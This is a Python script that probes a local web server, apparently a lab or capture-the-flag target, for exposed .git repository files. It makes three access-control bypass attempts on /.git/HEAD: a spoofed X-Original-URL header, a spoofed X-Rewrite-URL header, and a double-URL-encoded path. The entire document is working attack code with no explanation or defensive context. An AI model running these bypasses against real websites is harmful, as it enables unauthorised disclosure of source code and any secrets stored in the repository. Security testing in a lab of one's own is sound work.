import urllib.request
import urllib.error

target = "http://127.0.0.1:32867"

print("Testing .git bypass with urllib\n")

# Test 1: X-Original-URL header
print("[1] X-Original-URL header")
try:
    req = urllib.request.Request(
        f"{target}/.git/HEAD",
        headers={"X-Original-URL": "/.git/HEAD"}
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        content = response.read().decode('utf-8')
        print(f"Status: {response.status}")
        print(f"Content-Type: {response.headers.get('Content-Type')}")
        print(f"Response: {content}\n")
except urllib.error.HTTPError as e:
    print(f"HTTP Error: {e.code} {e.reason}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 2: X-Rewrite-URL header  
print("[2] X-Rewrite-URL header")
try:
    req = urllib.request.Request(
        f"{target}/.git/HEAD",
        headers={"X-Rewrite-URL": "/.git/HEAD"}
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        content = response.read().decode('utf-8')
        print(f"Status: {response.status}")
        print(f"Content-Type: {response.headers.get('Content-Type')}")
        print(f"Response: {content}\n")
except urllib.error.HTTPError as e:
    print(f"HTTP Error: {e.code} {e.reason}\n")
except Exception as e:
    print(f"Error: {e}\n")

# Test 3: Double encoding
print("[3] Double URL encoding: /%252egit/HEAD")
try:
    req = urllib.request.Request(f"{target}/%252egit/HEAD")
    with urllib.request.urlopen(req, timeout=5) as response:
        content = response.read().decode('utf-8')
        print(f"Status: {response.status}")
        print(f"Response: {content}\n")
except urllib.error.HTTPError as e:
    print(f"HTTP Error: {e.code} {e.reason}\n")
except Exception as e:
    print(f"Error: {e}\n")

print("Testing complete")

